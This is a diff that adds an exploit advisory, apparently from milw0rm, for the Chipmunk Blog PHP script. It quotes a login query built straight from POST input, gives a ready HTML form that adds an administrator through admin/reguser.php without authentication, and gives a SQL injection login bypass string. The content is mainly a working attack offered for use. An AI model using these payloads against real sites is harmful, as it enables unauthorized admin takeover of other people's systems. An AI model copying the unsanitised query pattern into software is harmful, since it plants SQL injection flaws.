@@ -1,0 +1,48 @@
+#########################################################################################
+[0x01] Informations:
+
+Script         : Chipmunk Blog
+Download       : http://www.chipmunk-scripts.com/blog/blog.zip
+Vulnerability  : Add Admin Exploit\Auth Bypass
+Author         : x0r
+Contact        : x0r@live.it \ andry2000@hotmail.it
+Website        : NULL
+
+#########################################################################################
+[0x02] Bug: \admin\reguser.php \admin\authenticate.php
+
+if (isset($_POST['submit'])) // name of submit button
+{
+   $username=$_POST['username'];
+   $password=$_POST['password'];
+   $password=md5($password);
+   $getadmin="SELECT * from bl_admin where username='$username' and
+password='$password'";
+   $getadmin2=mysql_query($getadmin) or die("Could not get admin");
+
+
+#########################################################################################
+[0x03] Exploit:
+
+Add Admin:
+
+<html>
+<head>
+<title> Chipmunk Blog (reguser.php) Add Admin Exploit (html)</title>
+</head>
+<body>
+<form action=http://xxxxxxx/blog/admin/reguser.php method=post>
+Username:<br>
+<input type=text name='username' value='x0r' size="20"><br>
+Password:<br>
+<input type=text name='password' value='h4x0rz' size="20"><br>
+<input type="text" name="pass2" value='h4x0rz' size="15"><br>
+<input type=submit name='submit' value='submit'><br>
+</form>
+</body>
+</html>
+
+Exploit2: admin ' or ' 1=1--
+#########################################################################################
+
+# milw0rm.com [2009-01-28]
